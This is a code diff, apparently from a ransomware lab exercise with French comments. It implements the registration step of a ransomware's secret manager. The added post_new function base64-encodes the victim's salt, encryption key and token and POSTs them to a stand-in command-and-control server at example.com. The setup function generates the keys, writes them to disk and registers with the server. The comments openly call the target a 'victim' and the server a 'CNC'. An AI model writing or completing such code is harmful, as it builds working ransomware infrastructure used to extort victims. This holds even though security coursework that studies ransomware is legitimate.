@@ -6,6 +6,7 @@ from typing import List, Tuple
 import os.path
 import requests
 import base64
+import json
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -32,7 +33,7 @@ class SecretManager:
         kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.TOKEN_LENGTH, salt=salt, iterations=self.ITERATION)#On hache le sel en SHA256 (sur 16 bits)
         dk = kdf.derive(key)#on dérive le hachage avec la clé qui est elle aussi random
         return dk
-    
+    #
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
@@ -51,12 +52,28 @@ class SecretManager:
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+        salt_b64 = base64.b64encode(salt).decode()
+        key_b64 = base64.b64encode(key).decode()
+        token_b64 = base64.b64encode(token).decode()
+        data = {"token": token_b64, "salt": salt_b64, "key": key_b64}
+        json_data = json.dumps(data)
+        #on met les données crypto en base 64 pour être sur qu'elles seront bien transmises sans être erronées.
+        response = requests.post("http://example.com/new", json=json_data)
+        #on envoie une requête POST à un serveur distant
+        if response.status_code != 200:
+            raise Exception("Failed to send data to server")
+        #on vérifie si la requête a bien été envoyée.
+
+        
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+        salt, key, token = self.create()
+        with open(os.path.join(self._path, 'salt.bin'), 'wb') as salt_file:
+            salt_file.write(salt)
+        with open(os.path.join(self._path, 'key.bin'), 'wb') as key_file:
+            key_file.write(key)
+        self.post_new(salt, key, token)
 
     def load(self)->None:
         # function to load crypto data
